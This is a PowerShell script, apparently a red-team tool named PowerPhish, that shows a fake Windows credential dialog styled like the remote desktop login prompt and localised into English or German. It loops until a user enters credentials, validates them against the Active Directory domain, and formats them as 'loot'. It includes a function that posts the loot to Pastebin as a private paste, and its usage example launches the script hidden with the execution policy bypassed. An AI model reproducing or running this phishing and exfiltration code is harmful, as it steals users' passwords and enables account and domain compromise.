<# PowerPhish credential stealer

.DESCRIPTION This script is based on https://github.com/Dviros/CredsLeaker. It was trimmed down and modified to automatically switch languages based on the system language and upload the credentials to Pastebin.

.EXAMPLE powershell -ExecutionPolicy bypass -Windowstyle hidden -noninteractive -nologo -file "PowerPhish.ps1"

.LINK https://github.com/rtfmkiesel/PowerPhish
https://github.com/Dviros/CredsLeaker
#>

function Await($WinRtTask, $ResultType) {
	$asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
	$netTask = $asTask.Invoke($null, @($WinRtTask))
	$netTask.Wait(-1) | Out-Null
	$netTask.Result
}

# Post to Pastebin
function Submit-Pastebin($pastebin_dev_key, $pastebin_username, $pastebin_password, $loot) {
	# body for login request
	$body_login = @{
		api_dev_key = $pastebin_dev_key
		api_user_name = $pastebin_username
		api_user_password = $pastebin_password
	}

	# login to Pastebin for temporary API key
	Write-Host "Getting API key"
	$pastebin_api_key = Invoke-RestMethod -Method Post -Uri "https://pastebin.com/api/api_login.php" -Body $body_login

	# if $api_key is empty there was probably an authentication error
	if ($null -eq $pastebin_api_key) {
		Write-Host -ForegroundColor Red "Please check network connectivity, username, password or developer key"
		exit
	} else {
		# body for post request
		$body_post = @{
			api_option = "paste"
			api_user_key = $pastebin_api_key
			api_paste_private = "2"
			api_dev_key = $pastebin_dev_key
			api_paste_code = $loot
			api_paste_name = ((Get-Date -Format "yyyyMMdd_HHmmss") + "_Loot")
		}
		# post loot to Pastebin
		Write-Host "Sending loot to Pastebin"
		Invoke-RestMethod -Method Post -Uri "https://pastebin.com/api/api_post.php" -Body $body_post
		if (!$?) {
			Write-Host -ForegroundColor Red "Please check network connectivity, username, password or developer key"
			exit
		} else {
			Write-Host -ForegroundColor Green "Upload successful!"
			exit
		}
	}
}

# Pastebin username
$pastebin_username = "USERNAME"
# Pastebin password
$pastebin_password = "PASSWORD"
# Pastebin API key from https://pastebin.com/doc_api
$pastebin_dev_key = "DEVKEY"

# $target sets the "connection" name which is displayed in the message.
$target = "Microsoft Windows"

# Supported languages (text is inspired from the remote desktop login prompt)
$caption_en = "Enter your credentials"
$message_en = "These credentials will be used to connect to $target"
$caption_de = "Anmeldeinformationen eingeben"
$message_de = "Diese Anmeldeinformationen werden beim Herstellen einer Verbindung mit $target verwendet."

# This script currently only works on powershell 5
if ((Get-Host).Version.Major -ne 5) {
	# downgrade
	powershell -Version 5 -File $MyInvocation.MyCommand.Definition
	exit
}

# Get the first installed language with Get-WinUserLanguageList (if no supported language is found the script will use English)
$language =  $(Get-WinUserLanguageList)[0].LanguageTag
switch ($language) {
	en-AU {$caption = $caption_en;$message = $message_en}
	en-BZ {$caption = $caption_en;$message = $message_en}
	en-CA {$caption = $caption_en;$message = $message_en}
	en-CB {$caption = $caption_en;$message = $message_en}
	en-GB {$caption = $caption_en;$message = $message_en}
	en-IN {$caption = $caption_en;$message = $message_en}
	en-IE {$caption = $caption_en;$message = $message_en}
	en-JM {$caption = $caption_en;$message = $message_en}
	en-NZ {$caption = $caption_en;$message = $message_en}
	en-PH {$caption = $caption_en;$message = $message_en}
	en-ZA {$caption = $caption_en;$message = $message_en}
	en-TT {$caption = $caption_en;$message = $message_en}
	en-US {$caption = $caption_en;$message = $message_en}
	de-AT {$caption = $caption_de;$message = $message_de}
	de-DE {$caption = $caption_de;$message = $message_de}
	de-LI {$caption = $caption_de;$message = $message_de}
	de-LU {$caption = $caption_de;$message = $message_de}
	de-CH {$caption = $caption_de;$message = $message_de}
	default {$caption = $caption_en;$message = $message_en}
}

# Add assemblies
$null = [Windows.Security.Credentials.UI.CredentialPicker,Windows.Security.Credentials,ContentType=WindowsRuntime]
$null = [Windows.UI.Popups.MessageDialog,Windows.UI.Popups,ContentType=WindowsRuntime]
$null = [Windows.UI.Xaml.AdaptiveTrigger,Windows.UI.Xaml,ContentType=WindowsRuntime]
$null = [Windows.UI.Xaml.Controls.AppBar,Windows.UI.Xaml.Controls,ContentType=WindowsRuntime]
$null = Add-Type -AssemblyName System.Runtime.WindowsRuntime
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]

# Set the window options
$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$options.TargetName = $caption
$options.Caption = $caption
$options.Message = $message
$options.AuthenticationProtocol = [Windows.Security.Credentials.UI.AuthenticationProtocol]::Basic
$options.CredentialSaveOption = [Windows.Security.Credentials.UI.CredentialSaveOption]::Unselected

while ($True) {
	Write-Host "Waiting for user input"
	$creds = Await $([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])

	if ([string]::isnullorempty($creds.CredentialPassword)) {
		Write-Host -ForegroundColor Red "Password was empty!"
		continue
	} elseif ([string]::isnullorempty($creds.CredentialUserName)) {
		Write-Host -ForegroundColor Red "Username was empty!"
		continue
	} else {
		Write-Host "Validating credentials"
		$username = $creds.CredentialUserName
		$pass = $creds.CredentialPassword

		# check if part of AD or workgroup
		$domain = Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select -ExpandProperty Domain
		if ($domain -eq "WORKGROUP") {
			# not part of AD
			$loot = "$($username):$($pass)@$($env:COMPUTERNAME)"
			Write-Host -ForegroundColor Green "Houston we have LOOT:" 
			Write-Host -ForegroundColor Green $loot
			#Submit-Pastebin $pastebin_dev_key $pastebin_username $pastebin_password $loot
		} else {
			# validate creds against domain
			$pass_secstring = ConvertTo-SecureString $pass -AsPlainText -Force
			$creds_obj = New-Object System.Management.Automation.PSCredential($username, $pass_secstring)

			if (Test-ComputerSecureChannel -Credential $creds_obj) {
				$loot = "$($username):$($pass)@$($env:COMPUTERNAME)$($domain)"
				Write-Host -ForegroundColor Green "Houston we have LOOT:" 
				Write-Host -ForegroundColor Green $loot
				#Submit-Pastebin $pastebin_dev_key $pastebin_username $pastebin_password $loot
			} else {
				Write-Host -ForegroundColor Red "Wrong credentials entered!"
				continue
			}
		}
	}
}